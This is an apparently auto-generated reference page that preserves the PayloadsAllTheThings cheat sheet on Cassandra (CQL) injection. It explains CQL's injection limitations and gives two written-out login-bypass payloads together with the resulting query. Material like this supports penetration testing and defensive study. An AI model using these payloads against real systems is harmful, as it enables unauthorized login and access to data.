---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Cassandra Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-sql-injection-cassandra-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/Cassandra Injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Cassandra Injection](../../topics/sql-injection/cassandra-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-sql-injection-cassandra-injection |
| name | Cassandra Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md |

## Preserved Source Material

````yaml
_body: "# Cassandra Injection\n\n> Apache Cassandra is a free and open-source distributed wide column store NoSQL database\
  \ management system.\n\n## Summary\n\n* [CQL Injection Limitations](#cql-injection-limitations)\n* [Cassandra Comment](#cassandra-comment)\n\
  * [Cassandra Login Bypass](#cassandra-login-bypass)\n    * [Example #1](#example-1)\n    * [Example #2](#example-2)\n* [References](#references)\n\
  \n## CQL Injection Limitations\n\n* Cassandra is a non-relational database, so CQL doesn't support `JOIN` or `UNION` statements,\
  \ which makes cross-table queries more challenging.\n\n* Additionally, Cassandra lacks convenient built-in functions like\
  \ `DATABASE()` or `USER()` for retrieving database metadata.\n\n* Another limitation is the absence of the `OR` operator\
  \ in CQL, which prevents creating always-true conditions; for instance, a query like `SELECT * FROM table WHERE col1='a'\
  \ OR col2='b';` will be rejected.\n\n* Time-based SQL injections, which typically rely on functions like `SLEEP()` to introduce\
  \ a delay, are also difficult to execute in CQL since it doesn’t include a `SLEEP()` function.\n\n* CQL does not allow subqueries\
  \ or other nested statements, so a query like `SELECT * FROM table WHERE column=(SELECT column FROM table LIMIT 1);` would\
  \ be rejected.\n\n## Cassandra Comment\n\n```sql\n/* Cassandra Comment */\n```\n\n## Cassandra Login Bypass\n\n### Example\
  \ #1\n\n```sql\nusername: admin' ALLOW FILTERING; %00\npassword: ANY\n```\n\n### Example #2\n\n```sql\nusername: admin'/*\n\
  password: */and pass>'\n```\n\nThe injection would look like the following SQL query\n\n```sql\nSELECT * FROM users WHERE\
  \ user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;\n```\n\n## References\n\n* [Cassandra injection vulnerability\
  \ triggered - DATADOG - January 30, 2023](https://web.archive.org/web/20230130053010/https://docs.datadoghq.com/fr/security/default_rules/appsec-cass-injection-vulnerability-trigger/)\n\
  * [Investigating CQL injection in Apache Cassandra - Mehmet Leblebici - December 2, 2022](https://web.archive.org/web/20251213065510/https://www.invicti.com/blog/web-security/investigating-cql-injection-apache-cassandra)"
_relative_path: SQL Injection/Cassandra Injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/Cassandra Injection.md
````
